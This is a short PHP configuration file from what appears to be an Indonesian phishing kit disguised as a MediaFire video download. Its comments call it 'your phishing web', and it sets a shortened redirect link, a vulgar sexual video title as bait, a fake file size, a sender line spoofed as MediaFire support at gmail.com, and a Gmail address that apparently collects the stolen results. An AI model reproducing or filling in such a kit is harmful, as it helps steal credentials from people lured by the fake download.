<?php

$redirect = 'https://bit.ly/mediafire-jeje'; // LINK DOWNLOAD VIDEO
$namavideo = 'VIDEO JEJE NGENTOD'; // NAMA WEB PHISING MU
$download = '12,91MB'; // UKURAN DOWNLOAD

$sender = 'From: 『 Result MediaFire 』<support@gmail.com>'; // NAMA RESULT MU
$email = "whmkomini@gmail.com"; // GANTI EMAIL MU

?>